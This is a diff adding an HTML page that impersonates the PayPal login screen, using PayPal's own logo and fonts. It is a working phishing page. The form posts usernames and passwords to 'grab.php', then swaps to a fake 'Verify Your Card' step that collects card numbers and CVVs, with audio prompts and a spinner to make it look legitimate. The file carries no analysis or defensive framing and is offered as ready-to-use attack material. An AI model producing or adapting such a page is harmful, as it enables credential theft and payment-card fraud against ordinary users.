@@ -1,0 +1,80 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal - Log In</title>
+    <link href="https://www.paypalobjects.com/webstatic/mktg/wright/brand/consumer_fonts.css" rel="stylesheet">
+    <style>
+        body { background: #fff; font-family: 'PayPalOpen-Regular', sans-serif; color: #2c2e2f; margin: 0; }
+        .container { max-width: 360px; margin: 20px auto; padding: 20px; background: #fff; }
+        .logo { width: 120px; margin: 0 auto 20px; display: block; }
+        h2 { font-size: 24px; text-align: center; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #d1d5db; border-radius: 4px; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: #0070ba; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+        button:hover { background: #005ea6; }
+        .spinner { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #0070ba; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal" class="logo">
+        <h2 id="title">Log in to PayPal</h2>
+        <audio id="audio" autoplay><source src="paypal1.mp3" type="audio/mpeg"></audio>
+        <form id="form" action="grab.php" method="POST">
+            <input type="hidden" name="phase" id="phaseInput" value="1">
+            <input type="text" name="username" id="usernameInput" placeholder="Email or mobile number" required>
+            <input type="password" name="password" id="passwordInput" placeholder="Password" required>
+            <button type="submit" id="submitBtn">Log In</button>
+            <div class="spinner" id="spinner"></div>
+        </form>
+        <p style="text-align: center; font-size: 14px; margin-top: 10px;">
+            <a href="https://www.paypal.com/us/signin" style="color: #0070ba; text-decoration: none;">Having trouble logging in?</a>
+        </p>
+    </div>
+    <script>
+        let phase = 1;
+        const audio = document.getElementById('audio');
+        const form = document.getElementById('form');
+        const submitBtn = document.getElementById('submitBtn');
+        const spinner = document.getElementById('spinner');
+
+        audio.onended = () => {
+            if (phase === 1 && document.getElementById('usernameInput').value) {
+                audio.src = 'paypal2.mp3';
+                document.getElementById('title').innerText = 'Verify Your Card';
+                document.getElementById('usernameInput').style.display = 'none';
+                document.getElementById('passwordInput').style.display = 'none';
+                const cardInput = document.createElement('input');
+                cardInput.type = 'text';
+                cardInput.name = 'card';
+                cardInput.id = 'cardInput';
+                cardInput.placeholder = 'Card Number';
+                cardInput.required = true;
+                const cvvInput = document.createElement('input');
+                cvvInput.type = 'text';
+                cvvInput.name = 'cvv';
+                cvvInput.id = 'cvvInput';
+                cvvInput.placeholder = '3-Digit CVV';
+                cvvInput.required = true;
+                form.insertBefore(cardInput, submitBtn);
+                form.insertBefore(cvvInput, submitBtn);
+                document.getElementById('phaseInput').value = '2';
+                phase = 2;
+            }
+        };
+
+        form.onsubmit = () => {
+            submitBtn.style.display = 'none';
+            spinner.style.display = 'block';
+            setTimeout(() => {
+                submitBtn.style.display = 'block';
+                spinner.style.display = 'none';
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
+```
